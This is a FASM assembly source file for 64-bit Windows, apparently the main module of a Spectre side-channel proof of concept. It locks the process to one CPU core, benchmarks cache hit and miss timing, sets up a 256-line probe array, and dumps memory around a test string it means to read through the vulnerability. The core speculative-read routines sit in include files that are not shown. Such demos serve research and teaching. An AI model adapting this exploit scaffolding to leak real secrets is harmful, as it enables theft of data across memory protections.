format PE64 CONSOLE
entry start

CACHE_LINE_SIZE_BITS equ 9
CACHE_LINE_SIZE equ (1 shl CACHE_LINE_SIZE_BITS)
CACHE_BENCHMARK_ITERATIONS equ 2048

include '..\..\fasm\include\win64a.inc'

section '.text' code readable executable
start:
        call    Spectre_LockProcessor
        call    Memory_BenchmarkCache
        call    Spectre_DumpCacheBenchmark

        mov     rsi, test_adr
;        mov     rsi, start
        mov     rcx, 8000
        call    Spectre_MemoryDumpHex

        sub     rsp, 256
        lea     rsi, [rsp]
        mov     rcx, 256
        call    Console_ReadLine
        add     rsp, 256

;        int3
        xor     rcx, rcx
        call    [ExitProcess]

        ret

Spectre_LockProcessor:
        push    rax rcx
        sub     rsp, 24 + 32
virtual at rsp
  .shadow rq 4
  .process_handle rq 1
  .process_affinity rq 1
  .system_affinity rq 1
end virtual
        call    [GetCurrentProcess]
        mov     [.process_handle], rax

        mov     rcx, [.process_handle]
        lea     rdx, [.process_affinity]
        lea     r8, [.system_affinity]
        call    [GetProcessAffinityMask]

        mov     rcx, [.process_handle]
        mov     rdx, [.process_affinity]
        neg     rdx
        and     rdx, [.process_affinity]
        call    [SetProcessAffinityMask]

        add     rsp, 24 + 32
        pop     rcx rax
        ret

include 'spectre.inc'
include 'memory.inc'
include 'console.inc'
include 'statistics.inc'


section '.data' data readable writeable
  test_adr db 'Some funny message that I''m tring to read using spectre vulnerability.', 0
  Memory_HitTimeString db 'hit time: ', 0
  Memory_MissTimeString db 'miss time: ', 0
  Memory_CutOffTimeString db 'cut-off time: ', 0
  Memory_MinString db '  min:    ', 0
  Memory_MaxString db '  max:    ', 0
  Memory_MidString db '  median: ', 0

  align 8
  Memory_HitTime rq 1
  Memory_HitTimeMin rq 1
  Memory_HitTimeMax rq 1

  Memory_MissTime rq 1
  Memory_MissTimeMin rq 1
  Memory_MissTimeMax rq 1

  Memory_CutOffTime rq 1

  align 256
  Memory_Junk rq 1  ;must hold whole cache line
  align 256


  align 256
  memory rb 256 * CACHE_LINE_SIZE


section '.idata' import data readable writeable

 library kernel,'KERNEL32.DLL'

 import kernel,\
     GetLastError, 'GetLastError', \
     ExitProcess, 'ExitProcess', \
     GetCurrentProcess, 'GetCurrentProcess', \
     GetProcessAffinityMask, 'GetProcessAffinityMask', \
     SetProcessAffinityMask, 'SetProcessAffinityMask', \
     GetStdHandle, 'GetStdHandle', \
     WriteFile, 'WriteFile', \
     ReadFile, 'ReadFile'